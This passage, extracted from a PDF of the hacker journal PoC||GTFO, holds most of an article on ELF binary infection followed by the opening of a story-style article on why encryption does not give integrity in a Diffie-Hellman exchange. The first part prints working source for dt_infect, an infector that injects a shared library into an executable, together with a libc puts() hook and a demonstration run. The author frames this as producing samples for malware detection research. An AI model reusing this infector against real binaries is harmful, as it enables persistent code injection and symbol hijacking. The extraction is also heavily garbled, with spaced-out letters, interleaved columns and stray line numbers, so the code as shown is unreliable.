get. Even though the addresses of get_rip() and
Elf_hdr->e_entry are going to change at runtime,
they are still at a fixed distance from each other,
so we can use the delta between them and subtract
it from the return value of the get_rip() function,
which returns the address of the current instruction
pointer. We are therefore using IP-relative address-
ing tricks—very familiar to virus writers—to jump
back to the original entry point. Using IP relative
addressing tricks to calculate the new e_entry ad-
dress is only necessary when using branch instruc-
tions that require an absolute address such as indi-
rect jmp, call, or a push/ret combo. Otherwise,
you can simply use an immediate jmp or call on
the original e_entry value.
The get_rip() technique is old-school, and pri-
marily useful for finding the address of objects
within the parasite’s own body of code.
dt_infect for Shared Library Injection
The goal of this infection is to add a shared li-
brary dependency to a binary, so that the library
is loaded before any others. This is similar to using
LD_PRELOAD. Create a shared library with a function
from libc.so that you want to hijack, and modify
its behavior before calling the original function using
dlsym(). This is essentially shared library injection
into an executable and can be used for all sorts of
creative reasons: security instrumentation, keylog-
gers, virus infection, etc.
In the following example we hijack the function
called void puts(const char *) from libc. The
libevil.c code is the shared library we are going
to inject that has a modified version of puts(), as
demonstrated on page 55.
Resurrecting the Past with DT_NEEDED
Injection Techniques
Recently, I have been building ELF malware de-
tection technology, and have not always been able
to find the samples I needed for certain infection
types. In particular, needed a DT_NEEDED infector,
and one that was capable of overriding existing sym-
bols through shared library resolution precedence.
This results in a sort of permanent LD_PRELOAD ef-
fect.
Traditionally hackers have overwritten the DT_-
DEBUG dynamic tag and changed it to a DT_NEEDED,
which is quite easy to detect. dt_infect v1.0 is
able to infect using both methods. 33 Originally I
thought that Mayhem—the innovative force behind
ERESI and a brilliant hacker all around—had only
written about DT_DEBUG overwrites, but then I read
Phrack 61:8 The Cerberus ELF Interface and discov-
ered that he had already covered both DT_NEEDED
infection techniques, including precedence overrid-
ing for symbol hijacking. 34 Huge props to Mayhem
for paving the way for so many others! 35
I’m not entirely sure of the algorithm that
33 git
clone https://github.com/elfmaster/dt_infect
pocorgtfo20.pdf phrack61-8.txt
35 I second that. Another example of the passion-inspiring factor that is off the scale, even for Phrack. —PML
34 unzip
54$ ./ test
2 I am a h o s t e x e c u t a b l e f o r t e s t i n g p u r p o s e s
$ r e a d e l f −d t e s t | g r e p NEEDED
4 0 x0000000000000001 (NEEDED)
Shared l i b r a r y : [ l i b c . s o . 6 ]
$ ./ inject test
6 C r e a t i n g r e v e r s e t e x t padding i n f e c t i o n t o s t o r e new . d y n s t r s e c t i o n
Updating . d y n s t r s e c t i o n
8 M o d i f i e d d_entry . v a l u e o f DT_STRTAB t o : 3 f f 0 4 0 ( i n d e x : 9 )
S u c c e s s f u l l y i n j e c t e d ’ l i b e v i l . so ’ i n t o t a r g e t : ’ t e s t ’ .
10 Be s u r e t o move ’ l i b e v i l . s o ’ i n t o / l i b /x86_64−gnu−l i n u x /
12 $ sudo cp l i b e v i l . s o / l i b /x86_64−l i n u x −gnu /
$ sudo l d c o n f i g
14 $ . / t e s t
$ r e a d e l f −d t e s t | g r e p NEEDED
16 0 x0000000000000001 (NEEDED)
Shared l i b r a r y : [ l i b e v i l . s o ]
0 x0000000000000001 (NEEDED)
Shared l i b r a r y : [ l i b c . s o . 6 ]
18 $ . / t e s t
1 4m 4 h057 3 x 3 c u 7 4 b l 3 f 0 r 73571 ng purp0535
20 $
Example dt_infect Injection
55DT_NEEDED Infection for Symbol Hijacking
I naively used a reverse-text-padding infection to
make room for the new .dynstr section. This, how-
ever, does not work with PIE binaries, due to the
constraints on that infection method, but is trivial
to fix by simply changing the injection method to
something that works with PIE, i.e., text padding
infection, or PT_NOTE to PT_LOAD infection, UTI in-
fection, etc.
For example, we could use the following method.
First, use reverse text infection to make space for
a new .dynstr section, then memcpy old .dynstr
into the code cave created by it. Then append a
terminated string with the evil shared library base-
name to the new .dynstr. Confirm that there is
enough space after the dynamic segment to shift
all ElfN_Dyn entries forward by sizeof(Elf_Dyn)
entry bytes. Finally, re-create the dynamic seg-
ment by inserting a new DT_NEEDED entry be-
fore any other dynamic tags. Its d_un.d_val
should point to dynstr_vaddr + old_dynstr_len.
Modify its DT_STRTAB tag so that d_un.d_val =
dynstr_vaddr.
The new dynamic segment should look some-
thing like this:
[DT_NEEDED:
2 [DT_NEEDED:
[ . . several
4 [DT_STRTAB:
loc .)
" e v i l _ l i b . so " ]
" l i b c . so " ]
more t a g s . . . ]
0 x 3 f f 0 0 0 ] ( Adr o f new . d y n s t r
The code in libevil.c on page 57 will demon-
strate how we modify the behavior of the void
puts(const char *) function from libc.so. The
dt_infect code on page 58 implements the injection
of the libevil.so dependency into a target exe-
cutable. This will only work with executables that
use ET_EXEC due to the reverse text padding injec-
tion for the .dynstr table. Note that dt_infect has
a -f option to overwrite the DT_DEBUG tag instead of
overriding other dependencies with your own shared
object; this will require manual modification of the
.got.plt table to call your functions.
56i n t p u t s ( const char ∗ s t r i n g ) {
char ∗ s = ( char ∗ ) s t r i n g ;
char new [ 1 0 2 4 ] ;
int index = 0 ;
/∗ l i b e v i l . c
∗ l 3 3 t sp34k v e r s i o n o f puts ( ) f o r
DT_NEEDED . so i n j e c t i o n
∗ e l f m a s t e r 2/15/2019
∗/
#define _GNU_SOURCE
#include <d l f c n . h>
i n t ( ∗ o_puts ) ( const char ∗ ) ;
o_puts = ( i n t ( ∗ ) ( const char ∗ ) )
dlsym (RTLD_NEXT, " p u t s " ) ;
// This code i s a l 3 3 t s p 3 4 k v e r s i o n o f p u t s
long _write ( long , char ∗ , unsigned long ) ;
___memset( new , 0 , 1 0 2 4 ) ;
while ( ∗ s != ’ \0 ’ && i n d e x < 1 0 2 4 ) {
switch ( _toupper ( ∗ s ) ) {
case ’ I ’ :
new [ i n d e x ++] = ’ 1 ’ ;
break ;
case ’E ’ :
new [ i n d e x ++] = ’ 3 ’ ;
break ;
case ’ S ’ :
new [ i n d e x ++] = ’ 5 ’ ;
break ;
case ’T ’ :
new [ i n d e x ++] = ’ 7 ’ ;
break ;
case ’O ’ :
new [ i n d e x ++] = ’ 0 ’ ;
break ;
case ’A ’ :
new [ i n d e x ++] = ’ 4 ’ ;
break ;
default :
new [ i n d e x ++] = ∗ s ;
break ;
}
s ++;
}
char _toupper ( char c ) {
i f ( c >= ’ a ’ && c <= ’ z ’ )
return ( c = c + ’A ’ − ’ a ’ ) ;
return c ;
}
void ___memset( void ∗mem,
unsigned char byte , unsigned i n t l e n ) {
unsigned char ∗p = ( unsigned char ∗ )mem;
int i = l e n ;
while ( i −−) {
∗p = b y t e ;
p++;
}
}
return o_puts ( ( char ∗ ) new ) ;
}
libevil.c
57/∗ S h o r t e n e d v e r s i o n o f i n j e c t . c .
Unzip p o c o r g t f o 2 0 . p d f s c o p . z i p f o r a c o m p l e t e copy . ∗/
2
#include " / opt / e l f m a s t e r / i n c l u d e / l i b e l f m a s t e r . h"
4
#define
6 #define
#define
8 #define
PAGE_ALIGN_UP( x ) ( ( x + 4 0 9 5 ) & ~4095)
PT_PHDR_INDEX 0
PT_INTERP_INDEX 1
TMP " xyz . tmp"
10 b o o l dt_debug_method = f a l s e ;
b o o l calculate_new_dynentry_count ( e l f o b j _ t ∗ , u i n t 6 4 _ t ∗ , u i n t 6 4 _ t ∗ ) ;
12
b o o l modify_dynamic_segment ( e l f o b j _ t ∗ t a r g e t , u i n t 6 4 _ t dynstr_vaddr , u i n t 6 4 _ t e v i l _ o f f s e t ) {
14
b o o l use_debug_entry = f a l s e ;
bool res ;
16
u i n t 6 4 _ t dcount , dpadsz , i n d e x ;
u i n t 6 4 _ t o_dcount = 0 , d_index = 0 , dt_debug_index = 0 ;
18
elf_dynamic_entry_t d_entry ;
elf_dynamic_iterator_t d_iter ;
20
elf_error_t error ;
struct tmp_dtags {
22
b o o l needed ;
uint64_t value ;
24
uint64_t tag ;
TAILQ_ENTRY( tmp_dtags ) _ l i n k a g e ;
26
};
struct tmp_dtags ∗ c u r r e n t ;
28
TAILQ_HEAD( , tmp_dtags ) d t a g s _ l i s t ;
TAILQ_INIT(& d t a g s _ l i s t ) ;
30
calculate_new_dynentry_count ( t a r g e t , &dcount , &dpadsz ) ;
32
i f ( dcount == 0 ) {
f p r i n t f ( s t d e r r , "Not enough room t o s h i f t dynamic e n t r i e s f o r w a r d \n" ) ;
34
use_debug_entry = t r u e ;
} e l s e i f ( dt_debug_method == t r u e ) {
36
f p r i n t f ( s t d e r r , " F o r c i n g DT_DEBUG o v e r w r i t e . This t e c h n i q u e w i l l not g i v e \n"
" your i n j e c t e d s h a r e d l i b r a r y f u n c t i o n s p r e c e d e n c e o v e r any o t h e r l i b r a r i e s \n"
38
" and w i l l t h e r e f o r e r e q u i r e you t o manually o v e r w r i t e t h e . g o t . p l t e n t r i e s t o \n"
" p o i n t a t your custom s h a r e d l i b r a r y f u n c t i o n ( s ) \n" ) ;
40
use_debug_entry = t r u e ;
}
42
e l f _ d y n a m i c _ i t e r a t o r _ i n i t ( t a r g e t , &d _ i t e r ) ;
for ( ; ; ) {
44
r e s = e l f _ d y n a m i c _ i t e r a t o r _ n e x t (& d _ i t e r , &d_entry ) ;
i f ( r e s == ELF_ITER_DONE) break ;
46
struct tmp_dtags ∗n = m a l l o c ( s i z e o f ( ∗ n ) ) ;
48
i f ( n == NULL) return f a l s e ;
50
n−>v a l u e = d_entry . v a l u e ;
52
n−>t a g = d_entry . t a g ;
i f ( n−>t a g == DT_DEBUG) dt_debug_index = d_index ;
54
TAILQ_INSERT_TAIL(& d t a g s _ l i s t , n , _ l i n k a g e ) ;
d_index++;
56
}
58
60
62
64
/∗
∗
∗
∗
∗
∗
∗
In t h e f o l l o w i n g code we modify dynamic segment t o l o o k l i k e t h i s :
O r i g i n a l : DT_NEEDED: " l i b c . so " , DT_INIT : 0 x4009f0 , e t c .
M o d i f i e d : DT_NEEDED: " e v i l . so " , DT_NEEDED: " l i b c . so " , DT_INIT : 0 x4009f0 , e t c .
Which a c t s l i k e a permanent LD_PRELOAD.
...
I f t h e r e i s no room t o s h i f t t h e dynamic e n t r i e s s forward , t h e n we f a l l b a c k on a l e s s
e l e g a n t and e a s i e r t o d e t e c t method where we o v e r w r i t e DT_DEBUG and change i t t o a
58∗ DT_NEEDED e n t r y . This i s e a s i e r t o d e t e c t b e c a u s e o f t h e f a c t t h a t t h e l i n k e r a l w a y s
∗ c r e a t e s DT_NEEDED e n t r i e s so t h a t t h e y a r e c o n t i g u o u s whereas i n t h i s c a s e t h e DT_DEBUG
∗ t h a t we o v e r w r i t e i s g e n e r a l l y a b o u t 11 e n t r i e s a f t e r t h e l a s t DT_NEEDED e n t r y . ∗/
66
68
index = 0 ;
i f ( use_debug_entry == f a l s e ) {
d_entry . t a g = DT_NEEDED;
d_entry . v a l u e = e v i l _ o f f s e t ; /∗ O f f s e t i n t o . d y n s t r f o r " e v i l . so " ∗/
elf_dynamic_modify ( t a r g e t , 0 , &d_entry , t r u e , &e r r o r ) ;
index = 1 ;
}
70
72
74
76
TAILQ_FOREACH( c u r r e n t , &d t a g s _ l i s t , _ l i n k a g e ) {
i f ( use_debug_entry == t r u e && c u r r e n t −>t a g == DT_DEBUG) {
p r i n t f ( "%s O v e r w r i t i n g DT_DEBUG a t i n d e x : %zu \n" ,
dcount == 0 ? " F a l l i n g back t o " : " " , dt_debug_index ) ;
d_entry . t a g = DT_NEEDED;
d_entry . v a l u e = e v i l _ o f f s e t ;
elf_dynamic_modify ( t a r g e t , dt_debug_index , &d_entry , t r u e , &e r r o r ) ;
goto n e x t ;
}
i f ( c u r r e n t −>t a g == DT_STRTAB) {
d_entry . t a g = DT_STRTAB;
d_entry . v a l u e = dynstr_vaddr ;
elf_dynamic_modify ( t a r g e t , index , &d_entry , t r u e , &e r r o r ) ;
p r i n t f ( " M o d i f i e d d_entry . v a l u e o f DT_STRTAB t o : %l x ( i n d e x : %zu ) \n" ,
d_entry . v a l u e , i n d e x ) ;
goto n e x t ;
}
78
80
82
84
86
88
90
92
94
d_entry . t a g = c u r r e n t −>t a g ;
d_entry . v a l u e = c u r r e n t −>v a l u e ;
elf_dynamic_modify ( t a r g e t , index , &d_entry , t r u e , &e r r o r ) ;
98 n e x t :
i n d e x ++;
100
}
return t r u e ;
102 }
96
104 /∗ This f u n c t i o n w i l l t e l l us how many new ElfN_Dyn e n t r i e s can be added t o t h e dynamic
∗ segment , as t h e r e i s o f t e n s p a c e b e tw e e n . dynamic and t h e s e c t i o n f o l l o w i n g i t . ∗/
106 b o o l calculate_new_dynentry_count ( e l f o b j _ t ∗ t a r g e t , u i n t 6 4 _ t ∗ count , u i n t 6 4 _ t ∗ s i z e ) {
elf_section_iterator_t s_iter ;
108
struct e l f _ s e c t i o n s e c t i o n ;
size_t len ;
110
s i z e _ t dynsz = e l f _ c l a s s ( t a r g e t ) == e l f c l a s s 3 2 ? s i z e o f ( Elf32_Dyn ) :
s i z e o f ( Elf64_Dyn ) ;
112
uint64_t dyn_offset = 0 ;
∗ count = 0 ;
∗ size = 0;
114
116
e l f _ s e c t i o n _ i t e r a t o r _ i n i t ( t a r g e t , &s _ i t e r ) ;
while ( e l f _ s e c t i o n _ i t e r a t o r _ n e x t (& s _ i t e r , &s e c t i o n ) == ELF_ITER_OK) {
i f ( strcmp ( s e c t i o n . name , " . dynamic " ) == 0 ) {
dyn_offset = s e c t i o n . o f f s e t ;
} else i f ( dyn_offset > 0) {
len = s e c t i o n . o f f s e t − dyn_offset ;
∗ size = len ;
∗ count = l e n / dynsz ;
return t r u e ;
}
}
return f a l s e ;
118
120
122
124
126
128
}
59130
132
134
136
138
140
142
144
i n t main ( i n t a r g c , char ∗∗ a r g v ) {
u i n t 8 _ t ∗mem;
e l f o b j _ t so_obj ;
elfobj_t target ;
b o o l r e s , text_found = f a l s e ;
elf_segment_iterator_t p_iter ;
struct e l f _ s e g m e n t segment ;
struct e l f _ s e c t i o n s e c t i o n , dynstr_shdr ;
elf_section_iterator_t s_iter ;
s i z e _ t p a d d i n g S i z e , o_dynstr_size , d y n s t r _ s i z e , e h d r _ s i z e , f i n a l _ l e n ;
u i n t 6 4 _ t old_base , new_base , n_dynstr_vaddr , e v i l _ s t r i n g _ o f f s e t ;
elf_error_t error ;
char ∗ e v i l _ l i b , ∗ e x e c u t a b l e ;
int fd ;
ssize_t b ;
146
148
150
152
154
156
158
160
162
164
166
168
170
i f ( argc < 3) {
p r i n t f ( " Usage : %s [− f ] < l i b . so> <t a r g e t >\n" , a r g v [ 0 ] ) ;
p r i n t f ( "−f
F o r c e DT_DEBUG o v e r w r i t e t e c h n i q u e \n" ) ;
exit (0) ;
}
i f ( a r g v [ 1 ] [ 0 ] == ’− ’ && a r g v [ 1 ] [ 1 ] == ’ f ’ ) {
dt_debug_method = t r u e ;
e v i l _ l i b = argv [ 2 ] ;
e x e c u t a b l e = argv [ 3 ] ;
} else {
e v i l _ l i b = argv [ 1 ] ;
e x e c u t a b l e = argv [ 2 ] ;
}
e l f _ o p e n _ o b j e c t ( e x e c u t a b l e , &t a r g e t , ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &e r r o r ) ;
e h d r _ s i z e = e l f _ c l a s s (& t a r g e t ) == e l f c l a s s 3 2 ?
s i z e o f ( Elf32_Ehdr ) : s i z e o f ( Elf64_Ehdr ) ;
elf_section_by_name(& t a r g e t , " . d y n s t r " , &dynstr_shdr ) ;
p a d d i n g S i z e = PAGE_ALIGN_UP( dynstr_shdr . s i z e ) ;
elf_segment_by_index(& t a r g e t , PT_PHDR_INDEX, &segment ) ;
segment . o f f s e t += p a d d i n g S i z e ;
elf_segment_modify (& t a r g e t , PT_PHDR_INDEX, &segment , &e r r o r ) ;
elf_segment_by_index(& t a r g e t , PT_INTERP_INDEX, &segment ) ;
segment . o f f s e t += p a d d i n g S i z e ;
elf_segment_modify (& t a r g e t , PT_INTERP_INDEX, &segment , &e r r o r ) ;
172
174
176
178
180
182
184
186
188
190
192
194
p r i n t f ( " C r e a t i n g r e v e r s e t e x t padding i n f e c t i o n t o s t o r e new . d y n s t r s e c t i o n \n" ) ;
e l f _ s e g m e n t _ i t e r a t o r _ i n i t (& t a r g e t , &p _ i t e r ) ;
while ( e l f _ s e g m e n t _ i t e r a t o r _ n e x t (& p _ i t e r , &segment ) == ELF_ITER_OK) {
i f ( text_found == t r u e ) {
segment . o f f s e t += p a d d i n g S i z e ;
elf_segment_modify (& t a r g e t , p _ i t e r . i n d e x − 1 , &segment , &e r r o r ) ;
}
i f ( segment . t y p e == PT_LOAD && segment . o f f s e t == 0 ) {
old_base = segment . vaddr ;
segment . vaddr −= p a d d i n g S i z e ;
segment . paddr −= p a d d i n g S i z e ;
segment . f i l e s z += p a d d i n g S i z e ;
segment . memsz += p a d d i n g S i z e ;
new_base = segment . vaddr ;
text_found = t r u e ;
elf_segment_modify (& t a r g e t , p _ i t e r . i n d e x − 1 , &segment , &e r r o r ) ;
}
}
/∗ A d j u s t . d y n s t r so t h a t i t p o i n t s t o where t h e r e v e r s e t e x t e x t e n s i o n i s ; r i g h t a f t e r
∗ e l f _ h d r and r i g h t b e f o r e t h e s h i f t e d f o r w a r d phdr t a b l e .
Adjust a l l other s e c t i o n
∗ o f f s e t s by p a d d i n g S i z e t o s h i f t f o r w a r d beyond t h e i n j e c t i o n s i t e . ∗/
e l f _ s e c t i o n _ i t e r a t o r _ i n i t (& t a r g e t , &s _ i t e r ) ;
60196
198
200
202
204
206
208
210
212
214
216
218
220
222
while ( e l f _ s e c t i o n _ i t e r a t o r _ n e x t (& s _ i t e r , &s e c t i o n ) == ELF_ITER_OK) {
i f ( strcmp ( s e c t i o n . name , " . d y n s t r " ) == 0 ) {
p r i n t f ( " Updating . d y n s t r s e c t i o n \n" ) ;
s e c t i o n . o f f s e t = ehdr_size ;
s e c t i o n . a d d r e s s = old_base − p a d d i n g S i z e ;
s e c t i o n . a d d r e s s += e h d r _ s i z e ;
n_dynstr_vaddr = s e c t i o n . a d d r e s s ;
evil_string_offset = section . size ;
o_dynstr_size = s e c t i o n . s i z e ;
s e c t i o n . s i z e += s t r l e n ( e v i l _ l i b ) + 1 ;
dynstr_size = section . s i z e ;
r e s = e l f _ s e c t i o n _ m o d i f y (& t a r g e t , s _ i t e r . i n d e x − 1 , &s e c t i o n , &e r r o r ) ;
} else {
s e c t i o n . o f f s e t += p a d d i n g S i z e ;
r e s = e l f _ s e c t i o n _ m o d i f y (& t a r g e t , s _ i t e r . i n d e x − 1 , &s e c t i o n , &e r r o r ) ;
}
}
e l f _ s e c t i o n _ c o m m i t (& t a r g e t ) ;
i f ( e l f _ c l a s s (& t a r g e t ) == e l f c l a s s 3 2 ) {
t a r g e t . ehdr32−>e _ s h o f f += p a d d i n g S i z e ;
t a r g e t . ehdr32−>e _ p h o f f += p a d d i n g S i z e ;
} else {
t a r g e t . ehdr64−>e _ s h o f f += p a d d i n g S i z e ;
t a r g e t . ehdr64−>e _ p h o f f += p a d d i n g S i z e ;
}
modify_dynamic_segment(& t a r g e t , n_dynstr_vaddr , e v i l _ s t r i n g _ o f f s e t ) ;
// Write o u t our new e x e c u t a b l e w i t h new s t r i n g t a b l e .
f d = open (TMP, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU) ;
224
226
228
230
232
234
// Write i n i t i a l ELF f i l e h e a d e r
b = w r i t e ( fd , t a r g e t . mem, e h d r _ s i z e ) ;
// Write o u t our new . d y n s t r s e c t i o n i n t o our p a d d i n g s p a c e
b = w r i t e ( fd , e l f _ d y n s t r (& t a r g e t ) , o _ d y n s t r _ s i z e ) ;
b = w r i t e ( fd , e v i l _ l i b , s t r l e n ( e v i l _ l i b ) + 1 ) ;
b = l s e e k ( fd , e h d r _ s i z e + p a d d i n g S i z e , SEEK_SET) )
mem = t a r g e t .mem + e h d r _ s i z e ;
final_len = target . s i z e − ehdr_size ;
b = w r i t e ( fd , mem, f i n a l _ l e n ) ;
236
done :
e l f _ c l o s e _ o b j e c t (& t a r g e t ) ;
rename (TMP, e x e c u t a b l e ) ;
240
p r i n t f ( " S u c c e s s f u l l y i n j e c t e d ’% s ’ i n t o t a r g e t : ’% s ’ . \ n" , e v i l _ l i b , e x e c u t a b l e ) ;
e x i t (EXIT_SUCCESS) ;
242 }
238
6120:08
Encryption is Not Integrity!
by Cornelius Diekmann
teemed reader, don’t worry, the text you are reading
right now was generated by poc.py 36 .
“Couldn’t Bob just use TLS?”, you might ask.
For sure! A TLS handshake would authenticate the
DH values and everything would be fine. But using a
ready-made TLS implementation would also be bor-
ing. Furthermore, the handshake sketched above is
not TLS. In the course of this story, Bob will use
parts of the OpenSSL library to do parts of the DH
handshake for him. Will this help? Let the story
begin.
Don’t we all remember the following common
setup from our introductory security course? Bob
wants to send a secret message to Alice. In order
to obtain a key for encrypting the message, Alice
and Bob first use Diffie-Hellman (DH) to exchange
a fresh session key. With this fresh session key, Bob
symmetrically encrypts the message and sends it to
Alice. Carol volunteers to transmit the messages
between Bob and Alice. Here is the setup:
Alice
Carol
Bob
DH Values from Alice
Run 0: Prologue and Short recap of
Diffie-Hellman
DH values from Alice
compute session key
DH Values from Bob
Alice and Carol are just returning from their intro-
ductory security course. Bob, who also attended
the lecture, walks over to Alice. “If a message is
encrypted, an attacker cannot read it and thus can-
not modify it,” Bob says to Alice. Alice knows that
encryption does not provide integrity and immedi-
ately wants to call bullshit on Bob’s claim. But she
hesitates for a moment. Bob won’t appreciate an
abstract explanation anyway. “Let’s see where this
is going,” she thinks and agrees to follow his expla-
nation. “I hope there will be code?” Alice responds.
Bob nods.
“Carol, come over, Bob is explaining crypto,”
Alice shouts to Carol. Bob starts explaining, “Let’s
first create a fresh session key so I can send a secret
message to you, Alice.” Alice agrees, this sounds
like a good idea. To make the scenario realistic,
Alice makes sure that neither Bob nor Carol can
see her screen. She opens her python3 shell and
is about to generate some DH values. “We need a
large prime p and a generator g,” Alice says. “607
is a prime”, Bob says with Wikipedia open in his
browser. Alice, hoping that Bob is joking about the
size of his prime, suggests the smallest prime from
RFC 3526 as an example:
DH Values from Bob
compute session key
encrypt message
with session key
encrypted message
encrypted message
decrypt message
with session key
One of the first things we learn in our introduc-
tory security course is that Carol could Man-in-the-
Middle (MitM) the DH exchange to obtain session
keys with Alice and Bob herself, while poor Alice
and poor Bob still believe they are talking privately
with each other. The next thing an introductory
security course teaches us is how to prevent this at-
tack. And here is how this article differs from an
introductory security course: Bob has the miscon-
ception that he can use encryption to prevent unau-
thorized modification. As the title suggests, this
does not work out well for Bob. Neighbors, don’t
act like Bob.
Let us hear the story of Alice, Bob, and Carol.
Bob will make five different attempts to transmit the
encrypted message to Alice. He will try to use RSA
encryption to prevent a MitM attack. The proto-
col aborts prematurely if Carol could break the key
before Bob has sent the message.
I hear our quality-conscious readers ask “S-
tory?”, surely followed by “PoC or GTFO!” Es-
36 unzip
FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1
29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD
EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245
E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED
EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D
C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F
pocorgtfo20.pdf poc.py or git clone https://github.com/diekmann/encryption-is-not-integrity.git
62to Alice. Since ZZ b = ZZ a , Alice can decrypt the
message.
83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D
670C354E 4ABC9804 F1746C08 CA237327 FFFFFFFF FFFFFFFF
This is what Alice and Bob plan to do:
This is a 1536-bit prime. Alice notes fascinated,
“this prime has π in it!”
According to the RFC, the prime is p = 2 1536 −
1472
− 1 + 2 64 · (2 1406 pi + 741804). Alice contin-
2
ues to think aloud, “Let me reproduce this. Does
that formula actually compute the prime? Python3
integers have unlimited precision, but π is not an
integer.”
“Python also has floats,” Bob replies. Probably
Bob had not been joking when he suggested 607
as large prime previously. It seems that Bob has
no idea what ‘large’ means in cryptography. Mean-
while, using
Alice
Carol
Bob
xa = random()
ya = pow(g, xa, p)
xb = random()
yb = pow(g, xb, p)
(ya, g, p)
(ya, g, p)
ZZb = pow(ya, xb, p
yb
yb
>>> import decimal
ZZa = pow(yb, xa, p)
Alice has reproduced the calculation. By the
way, the generator g for said prime is conveniently
2.
A small refresher on DH follows. Note that the
RFC uses “^” for exponentiation.
ciphertext
ciphertext
Dec(ZZa , ciphertext)
= message
=== BEGIN SNIPPET RFC 2631 ===
2.1.1.
ciphertext =
Enc(ZZb , message)
Generation of ZZ
“Let’s go then,” Bob says. “Wait,” Alice intervenes,
“DH is only secure against passive attackers. An
active attacker could MitM our exchange.” Alice
and Bob look at Carol, she smiles. Alice contin-
ues, “What did you say in the beginning?” “Right,”
Bob says, “we must encrypt our DH values, so Carol
cannot MitM us.” Fortunately, Alice and Bob have
4096-bit RSA keys and have securely distributed
their public keys beforehand.
[...] the shared secret ZZ is generated as follows:
ZZ = g ^ (xb * xa) mod p
Note that the individual parties actually perform the
computations:
ZZ = (yb ^ xa)
mod p
= (ya ^ xb)
mod p
where ^ denotes exponentiation
“Okay, what should I do?” Alice asks. She knows
exactly what to do, but Bob’s stackoverflow-driven
approach to crypto may prove useful in the course
of this story. Bob types into Alice’s terminal:
ya is party a’s public key; ya = g ^ xa mod p
yb is party b’s public key; yb = g ^ xb mod p
xa is party a’s private key
xb is party b’s private key
p is a large prime
>>> import Crypto.PublicKey.RSA
=== END SNIPPET RFC 2631 ===
>>> def RSA_enc(k_pub, msg):
...
Alice takes the initiative, “Okay, I generate a se-
cret value (xa), compute ya = g xa mod p and send
to you ya, g, p. This is also how we did it in the
lecture.” Bob then has to choose a secret value (xb),
compute yb = g xb mod p and send yb back to Alice,
so she can compute ZZ a . Bob then uses the key
ZZ b he computed to encrypt a message and send it
return k_pub.encrypt(msg, None)[0]
He comments, “We can ignore this None and only
need the first value from the tuple. Both exist only
for compatibility.” Bob is right about that and we
now have a convenient textbook RSA encryption
function at hand.
63Run 1: RSA-Encrypted textbook DH
in one line of python
The prime p, the generator g, and the public keys
are public knowledge, also known to Carol (check
your textbook, neighbor). Consequently, Carol can
encrypt DH values, but she cannot read the ones
from Alice and Bob. Bob computes the shared DH
key as ya xb mod p, where Carol supplied 1 for ya.
Carol can be sure that Bob will compute a shared
key of 1, she doesn’t need to know any encrypted
values. Same goes for the exchange with Alice.
“No No,” Bob protests, “these values are not al-
lowed in DH.” Alice checks RFC 2631 and quotes:
«The following algorithm MAY be used to validate
a received public key y [...] Verify that y lies within
the interval [2,p-1]. If it does not, the key is in-
valid.» Bob replies, “So y = 1 is clearly invalid, you
must not do this Carol.” Alice objects, “The check
is optional, see this all-caps MAY there?” But Bob
feels certain that he is right and insists, “Any library
would reject this key!”
Now Alice and Bob are ready for their DH exchange.
In contrast to their original sketch, they will encrypt
their DH values with RSA. Alice generates:
>>> xa = int.from_bytes(os.urandom(192), byteorder=’big’)
>>> ya = pow(g, xa, p)
and sends
>>> RSA_enc(k_Bob_pub, (ya, g, p))
Alice sends 67507dee555403ad...
[504 bytes
omitted]. How does Alice send the message? She
hands it over to Carol. Carol starts fiddling around
with with the data. “What are you doing?” Bob
asks. Alice replies, “It is encrypted, those were your
words. Carol will deliver the message to you.”
Carol forwards 23159f4e2daf11a6... [504 bytes
omitted]. Bob decrypts with his private RSA key,
parses ya, g, p from the message, and computes
Run 2: RSA-Encrypted textbook DH
using parts of the OpenSSL library
>>> xb = int.from_bytes(os.urandom(192), byteorder=’big’)
>>> yb = pow(g, xb, p)
“Sure, we’ll give it a try.” Alice responds. She sticks
to her old code because the RFC clearly states the
check optional, but Bob can reject the weak values.
Alice sends 9bbc45d463d85250... [504 bytes
omitted]. Carol, testing the same trick again,
forwards 23159f4e2daf11a6... [504 bytes omitted].
Bob now uses pyca/cryptography with the openssl
backend to do the DH computation. Maybe just do-
ing ZZ_b = pow(ya, xb, p) was too simple? Let’s
see what happens when we use some part of the
OpenSSL library (wrapped by pyca/cryptography)
to perform the same computation. A word of clar-
ification: The OpenSSL library is only used to im-
plement the DH part on Bob’s side, the exchange
is not tunneled over TLS. The RSA-part remains
unchanged.
>>> ZZ_b = pow(ya, xb, p)
and sends
>>> RSA_enc(k_Alice_pub, yb)
Bob sends 86dcf718bad3ee88... [504 bytes omit-
ted]. Carol forwards a different message. Alice per-
forms her part to finish the DH handshake. Carol
exclaims, “The key is 1!” Bob and Alice check. Carol
is right. How can Carol know the established keys?
Bob is right about one thing, the DH values were
encrypted, so a trivial textbook DH MitM attack
does not work since Carol cannot get the ya and
yb values. But she doesn’t need to. This is what
happened so far:
Alice
Carol
>>> from cryptography.hazmat.primitives.asymmetric import dh
Bob
>>> from cryptography.hazmat.backends import openssl
RSA(k_Bob_pub, (ya, g, p))
>>> pn = dh.DHParameterNumbers(p, g)
>>> parameters = pn.parameters(openssl.backend)
RSA(k_Bob_pub, (1, g, p))
>>> xb = parameters.generate_private_key()
RSA decrypt
ZZb = pow(1, xb, p)
>>> # feed ya to the openssl library backend
>>> alice_public_key = dh.DHPublicNumbers(ya, pn).public_key(openssl.backend)
RSA(k_Alice_pub, yb)
>>> assert alice_public_key.key_size == 1536 # 1536-bit MODP
group of our prime
RSA(k_Alice_pub, 1)
>>> yb = xb.public_key().public_numbers().y
>>> ZZ_b = xb.exchange(alice_public_key)
RSA decrypt
ZZa = pow(1, xa, p)
64And indeed, the last line aborts with the ex-
ception ‘ValueError: Public key value is invalid for
this exchange.’ Alice and Bob abort the handshake.
This is what happened so far:
>>> iv = os.urandom(16)
>>> aeskey = kdf128(ZZ_b) # squash the key to 128 bit
>>> ct = aes128_ctr(iv, aeskey, b’Hey Alice!
See, this is
perfectly secure now.’)
